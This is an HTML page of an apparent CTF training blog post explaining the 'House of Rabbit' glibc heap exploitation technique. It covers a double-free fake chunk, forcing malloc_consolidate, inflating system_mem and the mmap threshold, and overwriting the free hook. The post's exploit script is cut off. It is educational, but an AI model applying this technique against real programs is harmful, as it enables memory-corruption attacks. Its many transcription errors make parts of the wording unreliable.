@@ -1,0 +1,1040 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="House of rabbit is a technique for counterfeiting piles that was introduced as early as 2017 but only appeared in the CTF competition in the last two months. We generally use it in the fastbin attack, because other bins such as unsorted bin have better utilization"><title>The House of Rabbit</title>
+<link rel=canonical href=https://demo.stack.jimmycai.com/p/the-house-of-rabbit/><link rel=stylesheet href=/scss/style.min.0304c6baf04e01a8fe70693791cb744d56a3578a3120a8796cefc66825aa39c7.css><meta property='og:title' content="The House of Rabbit"><meta property='og:description' content="House of rabbit is a technique for counterfeiting piles that was introduced as early as 2017 but only appeared in the CTF competition in the last two months. We generally use it in the fastbin attack, because other bins such as unsorted bin have better utilization"><meta property='og:url' content='https://demo.stack.jimmycai.com/p/the-house-of-rabbit/'><meta property='og:site_name' content="Blog's Broder"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='pwnable'><meta property='article:published_time' content='2024-06-28T00:00:00+00:00'><meta property='article:modified_time' content='2024-06-28T00:00:00+00:00'><meta property='og:image' content='https://demo.stack.jimmycai.com/p/the-house-of-rabbit/cover.jpg'><meta name=twitter:title content="The House of Rabbit"><meta name=twitter:description content="House of rabbit is a technique for counterfeiting piles that was introduced as early as 2017 but only appeared in the CTF competition in the last two months. We generally use it in the fastbin attack, because other bins such as unsorted bin have better utilization"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://demo.stack.jimmycai.com/p/the-house-of-rabbit/cover.jpg'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu52d511cf9903ea4ad70f535dcc239819_494186_300x0_resize_box_3.png width=300 height=298 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>❟❛❟</span></figure><div class=site-meta><h1 class=site-name><a href=/>Blog's Broder</a></h1><h2 class=site-description>“Sometimes You Must Hurt In Order To Know, Fall In Order To Grow, Lose In Order To Gain, Because Life’s Greatest Lessons Are Learned Through Pain.” - Pain</h2></div></header><ol class=menu-social><li><a href=https://github.com/BabyBroder target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://x.com/broder5631 target=_blank title=Twitter rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/about-me/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>About me</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#overall>Overall</a></li><li><a href=#approach>Approach</a></li><li><a href=#further-use>Further use</a></li><li><a href=#limitations>Limitations</a></li><li><a href=#note>Note</a></li><li><a href=#script>Script</a><ol><li><a href=#targetpy>target.py</a></li><li><a href=#shellpy>shell.py</a></li></ol></li><li><a href=#heap-feng-shui>Heap Feng Shui</a><ol><li><a href=#shellpy-1>shell.py</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/the-house-of-rabbit/><img src=/p/the-house-of-rabbit/cover_hu9d8857c717d96ad2f86768a20d874436_10244_800x0_resize_q75_box.jpg srcset="/p/the-house-of-rabbit/cover_hu9d8857c717d96ad2f86768a20d874436_10244_800x0_resize_q75_box.jpg 800w, /p/the-house-of-rabbit/cover_hu9d8857c717d96ad2f86768a20d874436_10244_1600x0_resize_q75_box.jpg 1600w" width=800 height=450 loading=lazy alt="Featured image of post The House of Rabbit"></a></div><div class=article-details><header class=article-category><a href=/categories/heap/>Heap
+</a><a href=/categories/exploit/>Exploit
+</a><a href=/categories/ctf/>CTF
+</a><a href=/categories/linux-heap-exploitation---part-2/>Linux Heap Exploitation - Part 2</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/the-house-of-rabbit/>The House of Rabbit</a></h2><h3 class=article-subtitle>House of rabbit is a technique for counterfeiting piles that was introduced as early as 2017 but only appeared in the CTF competition in the last two months. We generally use it in the fastbin attack, because other bins such as unsorted bin have better utilization</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Jun 28, 2024</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>32 minute read</time></div></footer></div></header><section class=article-content><h2 id=overall>Overall</h2><ul><li>Leverage a heap bug to link a fake chunk into a fastbin, the fake chunk consists of 2 size fields: one belongs to the fake chunk itself and the other belongs to the succeeding chunk’s size field. However, the succeeding chunk’s size field is placed 0x10 bytes before the fake chunk’s size field. The fake chunk wraps around the VA space with a size field of 0xfffffffffffffff1 and the succeeding chunk’s size is set to 0x11 (a so-called fencepost chunk). This is the smallest memory footprint a fake chunk can assume whilst satisfying fastbin next size checks and avoiding consolidation attempts.</li><li>Once the fake chunk is linked into a fastbin it is consolidated into the unsortedbin via malloc_consolidate(). malloc_consolidate() cannot be triggered via malloc() because this results in the fake chunk being sorted which triggers an abort() call when it fails a size sanity check. Instead the fake chunk is sorted by freeing a chunk that exceeds the FASTBIN_CONSOLIDATION_THRESHOLD (0x10000 by default), this can be achieved by freeing a normal chunk that borders the top chunk because _int_free() considers the entire consolidated space to be the size of the freed chunk.</li><li>Modify the fake chunk size so that it can be sorted into the largest largebin (bin[126]), malloc only searches this bin for very large requests. To qualify for this bin the fake chunk size must be 0x80001 or larger. Sort the fake chunk into bin[126] by requesting a larger chunk. If the arena’s system_mem variable is less than 0x80000, which it will be under default conditions when this heap has not been extended, it is required to artificially increase system_mem by requesting a large chunk, freeing it and requesting it again.</li><li>Now that the fake chunk is linked into the largest largebin, it is safe to return its size to 0xfffffffffffffff1. Note that such a large size may not be appropriate when attempting to overwrite stack variables as the fake chunk size may be larger than av->system_mem after the allocation. This will fail a size sanity check during subsequent allocation from the unsortedbin.</li><li>This provides a House of Force-like primitive where a large request can be made from the fake chunk that spans the gap between the fake chunk and target memory.</li></ul><h2 id=approach>Approach</h2><ul><li>Forge a House of Force-like primitive by linking a fake chunk into the largest largebin and setting its size field to a very large value.</li></ul><h2 id=further-use>Further use</h2><ul><li>An alternative to using a large fake chunk that wraps around the VA space during the initial link into a fastbin is to use a fake fast chunk with trailing fencepost chunks. This requires more controlled memory but bypasses the size sanity checks in malloc_consolidate() as of GLIBC 2.27.</li></ul><h2 id=limitations>Limitations</h2><ul><li>The size vs prev_size check introduced in GLIBC 2.26 means a designer must manually populate the prev_size field of the fake fencepost chunk.</li></ul><h2 id=note>Note</h2><ul><li><p>In the House of force, this was easy glimpse versions before 2.8 to 2.9 don&rsquo;t have any top chunk size integrity checks. And as long as the larger request could not be serviced from any of an arenas Binz, the corrupt top chunk would be used. In my situation, however, I don&rsquo;t want to allocate from the top chunk, I want to allocate froma fake chunk.</p></li><li><p>Of course, I&rsquo;re going to have to link my fake chunk into an arena, but which bin i link it into is also important.</p><ul><li>Large requests will only be serviced from the unsorted bin or the appropriate large bin.</li><li>So I can&rsquo;t just fast bin dup my fake chunk into the fast bins in <a class=link href=/tWZjgCYaQ8qEF4axdBotiA>House of Lore</a>. It&rsquo;s into the small bins, then hope for the best.</li><li>When a chunk is allocated or sorted from the unsorted bin, it&rsquo;s subject to a size sanity check. This check means that I can&rsquo;t simply allocate our fake junk from the unsorted bin because it needs to be much larger than the check will allow.</li><li>However, allocations from the large bins are not subject to any size sanity checks. Also, recall that the largest large bid has no cap on the size of requests it can service. So if I can link our fake chunk into the largest large bin, I could safely make arbitrarily large allocations from it. Incidentally, the largest large bin is also known as bin 126 after its position in an arenas bins array, bin 127 is present but unused.</li><li>-> The quickest route to linking our fake junk into bin at 126 like I do in the House of Lore.</li></ul></li><li><p>Unfortunately, my double free bug ability to control such a small amount of junk user data and the fact that I only control one codewords of our fake junk make using this technique difficult, if not impossible. Even if I could leverage the <a class=link href=/tWZjgCYaQ8qEF4axdBotiA>House of Lore</a> to link our fake chunk into the unsorted bin, then sort it into bin 126 would corrupt the unsorted bin in the process, making progress from there very difficult.</p></li><li><p>It would be great if I could just double free a very large chunk, then tamper with its metadata in the same way I&rsquo;ve done before in the fast bin dup technique.</p><ul><li>However, the normal chunk double for mitigation checks, the prev in use flag of the succeeding chunk, something that&rsquo;s out of our reach -> this doesn&rsquo;t work.</li></ul></li></ul><p><em><strong>Suitable target:</strong></em> fast bin.</p><ul><li>I only need to corrupt a single quad word to reliably link fake chunks into them, which can be done via a fast bin dup.</li><li>And the only metadata our fake chunk would need is an appropriate size field.</li></ul><p><em><strong>The question is having linked a fake chunk into the fast bins. How would I convince malloc to move it into the largest large bin?</strong></em></p><p>I can control the size of our fake junk via the age variable, so why don&rsquo;t we just set it to a large value and make the request?</p><ul><li>The problem with this approach is not only would the fake chunk fail the fast bins size integrity check, but malloc won&rsquo;t even attempt to search the fast bins for such a large request.</li><li>As I mentioned, I needed to move our fake chunk into the large bins for this to work. I learned in the House of Lore technique that chunks are sorted into the large bins via the unsorted bin.<ul><li>So first we&rsquo;ll need to move our fake junk from the fast bins into the unsorted bin.<ul><li>The function named Mallock Consolidate, it&rsquo;s responsible for flushing all the chunks in an arena&rsquo;s vast bins into its unsorted bin, consolidating those chunks along the way if it can.</li><li>The idea is that if a memory request can&rsquo;t be serviced, it may be because vast chunks are causing a heap fragemetation.</li><li>If mallock can consolidate any free fast chunks with their surrounding free space via the mallock consolidate function, it may result in a chunk large enough to service the request.</li></ul></li><li>Of course, this defeats the purpose of the fast bins, so it only occurs under certain memory pressure conditions.</li></ul></li></ul><p>I can&rsquo;t call mallock consolidate directly, it&rsquo;s called from within some of malloc core functions, including from two locations within malloc and one location within free.</p><ul><li><p>Fortunately for me, indirectly, triggering fast bin consolidation is relatively simple. Referencing the Heap Lab PDF, I can see the two locations within the malloc flow chart that malloc consolidate is called.</p><ul><li><img src=https://hackmd.io/_uploads/S1IJ6PCHC.png loading=lazy alt=image><ul><li>This one is easiest to reach. All I have to do is <em><strong>request a large chunk that 0x400 size and above.</strong></em></li><li>Once I&rsquo;ve done that I were able to trigger malloc consolidate; however, it will fail.</li><li>I can check which chunk was being unlinked, the next chunk variable. Malloc is trying to unlink a region of memory just after our fake chunk and malloc consolidate has determined the this doesn&rsquo;t exist.</li></ul></li></ul></li><li><p>I know how mallock determines a forward consolidation candidate, malloc <em><strong>looks at the size value of our fake chunk and scrolls forward in memory by that amount to find the next chunk.</strong></em></p></li><li><p>It then looks at the size value of that chunk scrolls forward again by that amount and it <em><strong>checks the prev in use flag of this third chunk</strong></em> if the third chunks prev in use flag is clear. That means the chunk after our fake chunk must be a consolidation candidate and malloc will consolidate the fake chunk forward with it.</p></li><li><p>The size field it encounters at that address is zero. Malloc doesn&rsquo;t check for size field integrity during this process, so it scrolls forward again by zero bytes.</p></li><li><p>Marlock checks the prev in U.S. flag at about a location which is clear, <em><strong>indicating that the chunk after our fake chunk is a consolidation candidate.</strong></em></p></li><li><p>The segmentation fault occurs when malloc tries to dereference NUL quad word, it believes to be forward and backward pointis belonging to this non-existent chunk.</p></li><li><p>I&rsquo;m already preventing backward to consolidation since our fake chunks size field has a set prev in use bit, but that&rsquo;s where our influence ends. If I had more control over memory in this region, I could provide fenceposts chunks, but I only control a single quad word and I need that for a size field.</p></li><li><p><em>Let&rsquo;s think about this, is there a chunk a size value that can, on its own prevent both backward and forward consolidation? The original House of Rabbit technique required control over two quad word to overcome our consolidation. The fake chunk size would be set to the largest possible value. that&rsquo;s 0xfffffffffffffff1, then a fencepost chunk was placed just before it. This had the effect of making the fake junk its own forward consolidation guard. malloc would look at its size field, scroll forward that amount to find the next chunk, wrapping around the VA space as it did so and coming to a stop at the fencepost chunk just before the fake chunk. Fencepost chunks are illegally-sized 0x10 chunks, and we briefly saw their use by malloc in the House of Orange technique in Part 1. While this approach could work if we controlled 2 nearby quadwords, sadly we only control 1.</em></p></li></ul><p>The solution we&rsquo;re going to use also involves making our fake chunk its own forward consolidation guard, just using a different size value. <em><strong>That value is 1.</strong></em></p><ul><li>Although this time due to an abort rather than a segfault.</li><li>Our fake chunk was able to avoid backward consolidation because it has a set prev_inuse flag and this time it also avoided forward consolidation. Malloc checked its size which is zero, flags don&rsquo;t count towards chunk size, so it scrolled forward in memory to the next chunk by zero bytes -> Our fake chunk is now its own nextchunk -> Malloc checks the size of the next chunk, still zero bytes and scrolls forward again by that amount -> Our fake chunk is now its own next next chunk.</li><li>Since this chunk has a set prev_inuse bit, that means from malloc&rsquo;s point of view, the chunk after our fake chunk isn&rsquo;t free and therefore not a consolidation candidate.</li><li>The result is that our fake chunk gets legitimately linked into the unsortedbin, avoiding any nasty segfaults.</li></ul><p><em><strong>It fails</strong></em>, this is the unsortedbin size sanity check, we&rsquo;ve come across it before, albeit briefly, it&rsquo;s there to ensure that unsorted chunks being allocated or sorted have a sensible size value.</p><ul><li>Sensible is defined here as no smaller than a fencepost chunk and no larger than the arena&rsquo;s system_mem value.<ul><li>system_mem value is a record of the total amount of memory this arena has checked out from the kernel.</li></ul></li><li>Our fake chunk is subject to this check because it&rsquo;s being sorted as a side effect of the large request we made to trigger malloc_consolidate() in the first place.<ul><li><img src=https://hackmd.io/_uploads/SJce1ACHC.png loading=lazy alt=image></li><li>We requested a 0x400-sized chunk and a quick look at the malloc flow chart in the PDF indicates that right after malloc_consolidate() is called malloc will search the unsortedbin, coming across our fake chunk, which fails the size sanity check.</li></ul></li><li>This is a problem, we need to call malloc_consolidate() to move our fake chunk into the unsortedbin and to avoid segfaulting along the way, our fake chunk needs to be an invalid size.</li></ul><p>Fortunately, there are a couple of solutions to this dilemma.</p><ul><li>One option is to preemptively free a large chunk into the unsortedbin before our fake chunk gets there. This way, our large request will still trigger malloc_consolidate(), but the large chunk in the unsorted bin will be allocated before the search makes it to our fake chunk.</li><li>The second option is more efficient however, and it&rsquo;s what we&rsquo;ll use in our exploit.</li></ul><p><em><strong>Take a look at the free flowchart in the HeapLAB PDF and note the fastbin consolidation event there.</strong></em></p><p><img src=https://hackmd.io/_uploads/S1f1WRAr0.png loading=lazy alt=image></p><ul><li>When freeing a normal chunk, malloc_consolidate() may be called if the chunk size surpasses something called the fastbin consolidation threshold.</li><li>If we can trigger malloc_consolidated() this way, via free() rather than malloc(), an unsortedbin search won&rsquo;t occur afterwards and our fake chunk will stay safely in the unsortedbin.</li></ul><p><em><strong>All we need to do is free a chunk larger than the fastbin consolidation threshold.</strong></em></p><ul><li>The fastbin consolidation threshold is a constant, different distros make compile their GLIBC binaries with different values, but by default it&rsquo;s set at 65536, or 0x10000.</li><li>Allocating and freeing a chunk of this size won&rsquo;t be an issue in the house_of_rabbit binary, but there&rsquo;s an even more efficient way to do this.</li><li>Notice how the size of the freed chunk is used to determine whether malloc_consolidate() is called after consolidation.</li><li>This means that freeing a small chunk that is subsequently consolidated with a larger chunk can trigger the behavior I want. Even better, this holds true for consolidation with the top chunk.</li><li>I&rsquo;m going to replace our large chunk with a much smaller one. Then I&rsquo;re going to free it. The request will no longer trigger malloc_consolidate(), instead this chunk will be consolidated with the top chunk in the usual way and its total size afterwards will be compared against the fastbin consolidation threshold.</li><li>Since our top chunk is much larger than the threshold, malloc_consolidate() will be triggered, but without the subsequent unsortedbin search, leaving our fake chunk in the unsortedbin.</li></ul><p><em><strong>Afterwards</strong></em>, I need to do is change our fake chunk size using the amend_age option in the program&rsquo;s menu to 0x80000 or larger, the minimum size that qualifies for bin 126. Then, I&rsquo;ll make a request for an even larger chunk, which should result in our fake chunk being sorted into the largest largebin. Requesting a smaller chunk would have the same effect, but would then remainder our fake chunk, dumping the remainder back into the unsortedbin.</p><ul><li>I could prevent this by stashing a smaller chunk in the unsortedbin that would get allocated after our fake chunk was sorted, but calls to malloc() are at a premium here, so I&rsquo;ll stick with the more efficient course of action.</li><li>Remember I can&rsquo;t set the fake chunk&rsquo;s size to the maximum yet, it still needs to pass the unsortedbin size sanity check as it&rsquo;s sorted into the largebins.</li><li>After that add a call to the malloc function requesting a chunk slightly larger than our latest fake chunk&rsquo;s size.</li></ul><p><em><strong>Unfortunately</strong></em>, the program fails again, the reason for this is that the unsortedbin size sanity check has stopped. If it isn&rsquo;t obvious, our fake chunk is still a much larger than the total memory the main arena has checked out from the kernel. From malloc&rsquo;s perspective, that shouldn&rsquo;t happen, hence the abort.</p><ul><li><p>The problem is our fake chunk can&rsquo;t be any smaller at this point, otherwise it won&rsquo;t get sorted into bin 126.
+<strong>So if I can&rsquo;t modify one side of the equation, can I modify the other?</strong></p></li><li><p><em><strong>If system_mem represents the total memory an arena has checked out, couldn&rsquo;t I just request more memory, increasing that value until it reaches the total I want?</strong></em></p></li><li><p>I&rsquo;re going to request a large chunk that should bring the total memory checked out by the main arena to the size of our fake chunk, 0x80000 or higher. The default heap start size on this distro is 0x21000. So if I keep to round numbers, a chunk size of 0x60000 should increase system_mem to 0x81000.</p><ul><li>I&rsquo;ll make this allocation at the start of the script so it doesn&rsquo;t interfere with our work so far.</li></ul></li><li><p>I&rsquo;re still tripping over the same exploit mitigation, what&rsquo;s going on here?</p></li><li><p>Let&rsquo;s inspect the main arena&rsquo;s system_mem value to check if our idea worked. It hasn&rsquo;t changed. Furthermore, issuing the &lsquo;heap&rsquo; command should show our 0x60000-sized chunk, but it doesn&rsquo;t.</p></li><li><p>It&rsquo;s due to something called the mmap threshold.</p><ul><li>When malloc receives a particularly large request, it assumes it&rsquo;s a one-off event, that the program won&rsquo;t be frequently allocating and freeing chunks of this size.</li><li>So to avoid a situation whereby this very large chunk gets trapped between smaller chunks, unable to be reclaimed by the system, malloc uses the mmap() syscall to request it directly without impacting any heaps.</li><li>The very large chunk then exists on its own, outside of any heap region, and can be immediately reclaimed by the system via munmap() when the program is done with it.</li></ul></li><li><p>As an aside, if you noticed that this large chunk doesn&rsquo;t start at the beginning of it&rsquo;s containing mapping, for example by using pwndbg&rsquo;s &lsquo;xinfo&rsquo; command, don&rsquo;t worry, the kernel has final say in the virtual address of mmapped regions and in this case has just appended the large chunk to an existing mapping made by the dynamic loader during process initialization.</p><ul><li>If you&rsquo;re curious as to why the chunk is a page too large, 0x61000 instead of 0x60000, it&rsquo;s because mmap size granularity is at the page level.</li><li>A 0x60000-sized chunk requires one quadword more than 0x60000 bytes to accommodate its unused prev_size field, which leads to that extra page getting mapped.</li><li>So my 0x60000 chunk ended up here because its size passed a threshold where malloc considers it more efficient to allocate it with mmap() instead of on a heap.</li></ul></li><li><p>The &ldquo;mmap_threshold&rdquo; variable resides in a struct labeled &ldquo;mp_&rdquo; of type &ldquo;malloc_par&rdquo;, short for &ldquo;malloc parameters&rdquo;.</p><ul><li>I might recognize the &ldquo;sbrk_base&rdquo; field of this struct, which we&rsquo;ve used a few times as a quick means of finding the start of the default heap.</li><li>The &ldquo;mmap_threshold&rdquo; variable holds its default and minimum value for this distro, 0x20000, as defined as 128 times 1024.</li><li>Distro maintainers might tweak this and it can be directly manipulated via a function called mallopt(), which is unfortunately unavailable to me in this scenario.</li></ul></li></ul><p><em><strong>Our problem is that as long as the mmap threshold remains at this value, we can&rsquo;t allocate large chunks on the default heap to increase its system_mem value.</strong></em></p><ul><li><p>I could of course allocate a series of smaller chunks, but this binary has a cap on total allocations so we need to do this more efficiently.</p></li><li><p><em><strong>It used to be the case that the mmap threshold was a fixed value, but nowadays it adapts to the size of chunks a program is using.</strong></em></p><ul><li>For example, if a program is making heavy use of chunks beyond the mmap threshold, allocating them all with mmap() rather than heap space is going to be much slower.</li><li>And since these chunks are most likely being freed often, the risk of them tying up memory is lessened.</li><li>In this case, malloc can adjust the mmap threshold to maintain efficiency.</li></ul></li><li><p><img src=https://hackmd.io/_uploads/H1r5JMJUC.png loading=lazy alt=image></p><ul><li>&ldquo;if (chunk is mmapped())&rdquo; is simply checking for the IS_MMAPPED flag, and these are the important lines of the next IF statement.</li><li>If the size of the chunk being freed is beyond the current mmap threshold, increase the mmap threshold to that chunk&rsquo;s size value.</li><li>-> We can take advantage of this by freeing our 0x60000-sized chunk to increase the mmap threshold, then requesting it again, at which point malloc should allocate it on the default heap rather than via mmap().</li></ul></li><li><p>At the start of our script, I&rsquo;ll make a second request for a 0x60000-sized chunk, and between them I&rsquo;ll free the first one. The first 0x60000 request will surpass the mmap threshold and gets allocated via mmap(), as I&rsquo;ve just witnessed.</p><ul><li>Freeing this chunk will simply unmap it, but in doing so malloc will adjust the mmap threshold to accommodate chunks of this size in the future.</li></ul></li><li><p>The second 0x60000 request is now below the mmap threshold and will be allocated from the heap like everything else.</p><ul><li>To service this request, malloc will have to extend the top chunk by requesting more memory from the kernel.</li><li>This, in turn, will increase the main arena&rsquo;s system_mem value, which has been our goal all along.</li></ul></li><li><p>To summarize, I used a double-free bug in this binary to link a fake chunk into the fastbins, I can use other bug types to achieve the same thing, but a double-free was all I had to work with here.</p></li><li><p>I then triggered the malloc_consolidate() function to move our fake chunk from the fastbins into the unsortedbin. I did this by freeing a normal chunk that bordered the top chunk, although if I wanted to be more efficient, I could have just freed the second 0x60000 chunk.</p></li><li><p>To ensure malloc_consolidate() didn&rsquo;t attempt to consolidate our fake chunk with its surrounding space, I set its prev_inuse flag, preventing backward consolidation and set its size to zero. This meant that our fake chunk became its own next chunk and its own next next chunk, preventing forward consolidation.</p></li><li><p>Once our fake chunk was safely linked into the unsortedbin, I changed its size to 0x80000 the smallest size eligible for the largest largebin or bin 126.</p></li><li><p>Before sorting it into that bin, I had to ensure it would pass the unsortedbin size sanity check.</p><ul><li>Along the way, this meant increasing the arena&rsquo;s system_mem value to the size of our fake chunk or higher.</li><li>I did this by allocating a 0x60000-sized chunk on the heap, which brought the system_mem total from 0x21000 to 0x81000.</li><li>This, in turn, was possible because I had also increased the mmap threshold by requesting, then freeing a 0x60000-sized chunk beforehand, allowing the second 0x60000 chunk to be allocated on the heap rather than via mmap().</li></ul></li><li><p>Now that our fake chunk was linked into the largest largebin, which has no size limit, I changed its size to the largest possible value.</p></li><li><p>Finally, thanks to the lack of largebin sanity checks, I made an allocation from our fake chunk that bridged the gap between itself and our target data. The next request I made was serviced from our fake chunk&rsquo;s remainder, which neatly overlapped the target, allowing us to overwrite it.</p></li><li><p>I&rsquo;re going to target the malloc hooks with our arbitrary write, specifically the free hook, since I can free chunks that contain attacker-controlled data.</p></li><li><p>To do this, I&rsquo;ll need to replace the &ldquo;distance&rdquo; variable with the distance between our fake chunk and a spot just before the free hook. This should leave the remainder of our fake chunk overlapping the free hook after the subsequent allocation.</p></li><li><p>When I allocate that remainder, I&rsquo;ll need to write 1 quadword of garbage to fill the gap between the start of chunk user data and the free hook because the free hook isn&rsquo;t 16-byte-aligned.</p></li><li><p>However, I&rsquo;re failing the unsortedbin size sanity check again.</p><ul><li>Now, the reason for this can be a little hard to track down.</li><li>The chunk that&rsquo;s failing the size sanity check is the remainder of our fake chunk, which now sits just before the free hook.</li><li>The size of this chunk is far in excess of even the artificially inflated system_mem value that I&rsquo;re dealing with.</li><li>The reason this mitigation wasn&rsquo;t triggered in my previous exploit is that I allocated so much of the original fake chunk&rsquo;s space to bridge the gap between it and the target data that the remainder&rsquo;s size fell back into a valid range.</li><li>In this case, I&rsquo;re only requesting a tiny portion of the huge fake chunk to bridge a much smaller gap, one that doesn&rsquo;t wrap around the VA space.</li><li>This leaves the remainder much larger than its arena&rsquo;s system_mem value.</li></ul></li><li><p>The solution to this problem is simple; I control the size of the fake chunk, so instead of setting it to the largest possible value, let&rsquo;s just keep it much smaller.</p></li></ul><h2 id=script>Script</h2><h3 id=targetpy>target.py</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
